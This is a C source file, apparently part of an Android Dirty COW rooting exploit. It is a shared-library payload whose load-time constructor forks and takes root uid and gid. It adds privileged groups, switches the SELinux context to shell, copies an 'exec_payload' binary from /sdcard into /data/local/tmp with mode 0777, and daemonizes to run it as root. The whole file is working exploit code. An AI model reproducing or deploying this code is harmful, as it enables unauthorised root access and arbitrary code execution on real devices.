//
// Created by k.leyfer on 15.03.2017.
//

#include <errno.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

#include <android/log.h>
#include <sys/stat.h>
#include "dirty/file_utils/file_utils.h"
#include "dirty/common/logging.h"

#define EXEC_PAYLOAD_SDCARD_PATH "/sdcard/exec_payload"
#define EXEC_PAYLOAD_DST_PATH "/data/local/tmp/exec_payload"

typedef int getcon_t(char** con);

typedef int setcon_t(const char* con);

__attribute__((constructor)) void say_hello()
{

  LOGV("%d: hi (%d)", getpid(), getuid());

  int orig_pid = getpid();
  pid_t pid = fork();
  if (pid == 0)
  {
    LOGV("fork %d->%d", orig_pid, getpid());

    if (getuid() != 0)
    {
      LOGV("running as uid %d\n", getuid());
      if (setresgid(0, 0, 0))
      {
        LOGV("setresgid failed: %s", strerror(errno));
        exit(0);
      }

      if (setresuid(0, 0, 0))
      {
        LOGV("setresuid failed: %s", strerror(errno));
        exit(0);
      }
    }

    gid_t groups[] = {
        1004,  // input
        2000,  // shell
        1007,  // log
        1011,  // adb
        1015,  // sdcard_rw
        1028,  // sdcard_r
    };

    if (setgroups(sizeof(groups) / sizeof(groups[0]), groups) != 0)
    {
      LOGV("Unable to set groups: %s", strerror(errno));
      exit(0);
    }
    else
    {
      LOGV("Set groups OK!");
    }

    dlerror();
#ifdef __aarch64__
    void * selinux = dlopen("/system/lib64/libselinux.so", RTLD_LAZY);
#else
    void* selinux = dlopen("/system/lib/libselinux.so", RTLD_LAZY);
#endif
    if (selinux)
    {
      void* getcon = dlsym(selinux, "getcon");
      const char* error = dlerror();
      if (error)
      {
        LOGV("dlsym error %s", error);
      }
      else
      {
        getcon_t* getcon_p = (getcon_t*) getcon;
        char* secontext;
        int ret = (*getcon_p)(&secontext);
        LOGV("current context: %d %s", ret, secontext);

        void* setcon = dlsym(selinux, "setcon");
        const char* error = dlerror();
        if (error)
        {
          LOGV("dlsym setcon error %s", error);
        }
        else
        {
          setcon_t* setcon_p = (setcon_t*) setcon;
          if ((*setcon_p)("u:r:shell:s0") != 0)
          {
            LOGV("Unable to set context: %s!", strerror(errno));
          }

          (*getcon_p)(&secontext);
          LOGV("Current context: %s", secontext);
        }
      }
      dlclose(selinux);
    }
    else
    {
      LOGV("SELinux not found.");
    }

    if (getuid() == 0)
    {
      LOGV("Got root");

      struct stat exec_payload_stat;
      if (stat(EXEC_PAYLOAD_DST_PATH, &exec_payload_stat) == -1)
      {
        LOGV("Unable to stat %s: %s!", EXEC_PAYLOAD_DST_PATH, strerror(errno));
        if (errno == ENOENT)
        {
          LOGV("Will copy exec_payload from /sdcard");
          if (stat(EXEC_PAYLOAD_SDCARD_PATH, &exec_payload_stat) == -1)
          {
            LOGV("Unable to open %s: %s!", EXEC_PAYLOAD_SDCARD_PATH, strerror(errno));
            exit(0);
          }

          if (copy_file_with_mode(EXEC_PAYLOAD_SDCARD_PATH, EXEC_PAYLOAD_DST_PATH, 0777) == -1)
          {
            LOGV("Unable to copy %s to %s!", EXEC_PAYLOAD_SDCARD_PATH, EXEC_PAYLOAD_DST_PATH);
            exit(0);
          }
        }
      }

      if (daemon(0, 0) == -1)
      {
        LOGV("Unable to daemonize process: %s!", strerror(errno));
      }
      else
      {
        LOGV("Run shared_payload as daemon!");
      }

      if (execle(EXEC_PAYLOAD_DST_PATH, EXEC_PAYLOAD_DST_PATH, (char*) NULL, environ) == -1)
      {
        LOGV("Unable to exec payload: %s!", strerror(errno));
      }
    }

    exit(0);
  }
}
